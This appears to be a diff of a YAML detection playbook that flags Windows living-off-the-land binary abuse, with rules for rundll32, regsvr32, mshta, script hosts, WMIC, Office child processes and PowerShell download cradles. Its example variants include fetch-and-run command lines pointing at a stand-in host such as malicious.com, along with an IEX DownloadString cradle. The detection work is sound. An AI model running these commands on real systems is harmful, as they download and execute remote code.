@@ -1,49 +1,250 @@
 ---
 # playbooks/windows/signal_lolbin_abuse.yaml
-# Detect LOLBin abuse (rundll32, regsvr32, mshta, powershell, etc.)
+# Detect LOLBin abuse (Living-off-the-land binaries)
 
+id: "windows_lolbin_abuse_001"
+title: "LOLBin Abuse Detection"
 name: "LOLBin Abuse Detection"
-description: "Detect suspicious use of Windows Living-off-the-land binaries"
-version: "1.0"
-requires: ["security_log"]
+family: "execution"
+version: "2.0"
+description: |
+  Detects suspicious use of Windows Living-off-the-land binaries (LOLBins):
+  - rundll32.exe, regsvr32.exe, mshta.exe
+  - certutil.exe, bitsadmin.exe
+  - wscript.exe, cscript.exe
+  - schtasks.exe, wmic.exe, sc.exe
+  - Suspicious arguments and parent processes
 
-detection:
-  signal:
-    type: "windows_lolbin_abuse"
-    lolbins:
-      - "rundll32.exe"
-      - "regsvr32.exe"
-      - "mshta.exe"
-      - "powershell.exe"
-      - "wscript.exe"
-      - "cscript.exe"
-      - "certutil.exe"
-      - "bitsadmin.exe"
-      - "schtasks.exe"
-      - "wmic.exe"
-      - "sc.exe"
-      - "net.exe"
-      - "nltest.exe"
-    suspicious_args:
-      - "-nop"
-      - "-enc"
-      - "-ep bypass"
-      - "System.Reflection"
-      - "IEX"
-      - "DownloadString"
+enabled: true
+confidence_threshold: 0.75
+
+requires:
+  - security_log
+
+mitre:
+  tactics:
+    - execution
+    - defense_evasion
+  techniques:
+    - T1218      # System Binary Proxy Execution
+    - T1218.010  # Regsvr32
+    - T1218.011  # Rundll32
+    - T1218.005  # Mshta
+
+input_facts:
+  required:
+    - Exec
+
+rules:
+  - name: "Rundll32 Remote Script"
+    window: 10
+    conditions:
+      - fact_type: Exec
+      - field: path
+        matches: "(?i)rundll32"
+      - field: cmdline
+        matches: "(?i)javascript:|vbscript:|http:|https:"
+    actions:
+      - severity: HIGH
+        tags:
+          - "lolbin"
+          - "rundll32"
+          - "script_execution"
+    expected:
+      facts:
+        - "rundll32.exe with script protocol (javascript:, vbscript:)"
+        - "rundll32.exe loading content from URL"
+      variants:
+        - label: "JavaScript Protocol"
+          facts:
+            - "rundll32.exe javascript:\"...\""
+        - label: "Remote DLL Load"
+          facts:
+            - "rundll32.exe http://malicious.com/payload.dll"
+      evidence:
+        lens: "process"
+        fact_types: ["Exec"]
+        query_terms: ["rundll32", "javascript", "vbscript", "http"]
+        event_ids: [4688, 1]
+      visibility_requires: ["security_log"]
+
+  - name: "Regsvr32 Remote Script"
+    window: 10
+    conditions:
+      - fact_type: Exec
+      - field: path
+        matches: "(?i)regsvr32"
+      - field: cmdline
+        matches: "(?i)/s.*/n.*/u.*/i:|scrobj\\.dll|http:|https:"
+    actions:
+      - severity: HIGH
+        tags:
+          - "lolbin"
+          - "regsvr32"
+          - "squiblydoo"
+    expected:
+      facts:
+        - "regsvr32.exe with /s /n /u /i: flags (Squiblydoo)"
+        - "regsvr32.exe loading remote scriptlet"
+      evidence:
+        lens: "process"
+        fact_types: ["Exec"]
+        query_terms: ["regsvr32", "/i:", "scrobj", "http"]
+        event_ids: [4688, 1]
+      visibility_requires: ["security_log"]
+
+  - name: "MSHTA Remote HTA"
+    window: 10
+    conditions:
+      - fact_type: Exec
+      - field: path
+        matches: "(?i)mshta"
+      - field: cmdline
+        matches: "(?i)http:|https:|javascript:|vbscript:"
+    actions:
+      - severity: HIGH
+        tags:
+          - "lolbin"
+          - "mshta"
+          - "hta_execution"
+    expected:
+      facts:
+        - "mshta.exe executing remote HTA file"
+        - "mshta.exe with inline script (javascript:, vbscript:)"
+      variants:
+        - label: "Remote HTA Execution"
+          facts:
+            - "mshta.exe http://malicious.com/payload.hta"
+        - label: "Inline JavaScript"
+          facts:
+            - "mshta.exe javascript:code"
+      evidence:
+        lens: "process"
+        fact_types: ["Exec"]
+        query_terms: ["mshta", "http", "javascript", "vbscript", ".hta"]
+        event_ids: [4688, 1]
+      visibility_requires: ["security_log"]
+
+  - name: "WScript/CScript Remote Script"
+    window: 10
+    conditions:
+      - fact_type: Exec
+      - field: path
+        matches: "(?i)wscript|cscript"
+      - field: cmdline
+        matches: "(?i)http:|https:|\\\\\\\\.*\\.js|\\\\\\\\.*\\.vbs"
+    actions:
+      - severity: HIGH
+        tags:
+          - "lolbin"
+          - "wscript"
+          - "script_execution"
+    expected:
+      facts:
+        - "wscript.exe or cscript.exe running remote script"
+        - "Script loaded from network share (UNC path)"
+      evidence:
+        lens: "script"
+        fact_types: ["Exec", "ScriptExec"]
+        query_terms: ["wscript", "cscript", ".js", ".vbs", "http"]
+        event_ids: [4688, 1]
+      visibility_requires: ["security_log"]
+
+  - name: "PowerShell Download Cradle"
+    window: 10
+    conditions:
+      - fact_type: Exec
+      - field: cmdline
+        matches: "(?i)powershell.*(iex|invoke-expression).*(downloadstring|webclient|invoke-webrequest)"
+    actions:
+      - severity: CRITICAL
+        tags:
+          - "lolbin"
+          - "powershell"
+          - "download_cradle"
+    expected:
+      facts:
+        - "PowerShell download cradle pattern detected"
+        - "IEX (Invoke-Expression) with DownloadString/WebClient"
+      variants:
+        - label: "DownloadString IEX"
+          facts:
+            - "IEX (New-Object Net.WebClient).DownloadString('url')"
+        - label: "Invoke-WebRequest"
+          facts:
+            - "IEX (Invoke-WebRequest 'url').Content"
+      evidence:
+        lens: "script"
+        fact_types: ["Exec", "ScriptExec"]
+        query_terms: ["powershell", "IEX", "DownloadString", "WebClient"]
+        event_ids: [4688, 1, 4104]
+      visibility_requires: ["security_log"]
+
+  - name: "WMIC Process Create"
+    window: 10
+    conditions:
+      - fact_type: Exec
+      - field: path
+        matches: "(?i)wmic"
+      - field: cmdline
+        matches: "(?i)process.*call.*create"
+    actions:
+      - severity: HIGH
+        tags:
+          - "lolbin"
+          - "wmic"
+          - "process_creation"
+    expected:
+      facts:
+        - "WMIC process call create - remote or local process spawning"
+        - "Potential lateral movement or evasion technique"
+      evidence:
+        lens: "process"
+        fact_types: ["Exec"]
+        query_terms: ["wmic", "process", "call", "create"]
+        event_ids: [4688, 1]
+      visibility_requires: ["security_log"]
+
+  - name: "Suspicious Parent-Child Relationship"
+    window: 30
+    conditions:
+      - fact_type: Exec
+      - field: parent
+        matches: "(?i)winword|excel|outlook|powerpnt"
+      - field: path
+        matches: "(?i)cmd|powershell|wscript|cscript|mshta"
+    actions:
+      - severity: HIGH
+        tags:
+          - "lolbin"
+          - "office_child"
+          - "suspicious_parent"
+    expected:
+      facts:
+        - "Office application spawning shell/script process"
+        - "Potential macro-based malware execution"
+      variants:
+        - label: "Word spawning CMD"
+          facts:
+            - "WINWORD.EXE → cmd.exe"
+        - label: "Excel spawning PowerShell"
+          facts:
+            - "EXCEL.EXE → powershell.exe"
+        - label: "Outlook spawning Script Host"
+          facts:
+            - "OUTLOOK.EXE → wscript.exe"
+      evidence:
+        lens: "process"
+        fact_types: ["Exec"]
+        query_terms: ["winword", "excel", "outlook", "cmd", "powershell"]
+        event_ids: [4688, 1]
+      visibility_requires: ["security_log"]
 
 response:
   severity: "high"
   actions:
     - alert: true
     - isolate: true
-    - block_network: false
-  
-  correlations:
-    - type: "same_parent_exe"
-      window: 300
-    - type: "parent_is_explorer_or_office"
-      multiplier: 1.5
 
 tags:
   - "T1218"
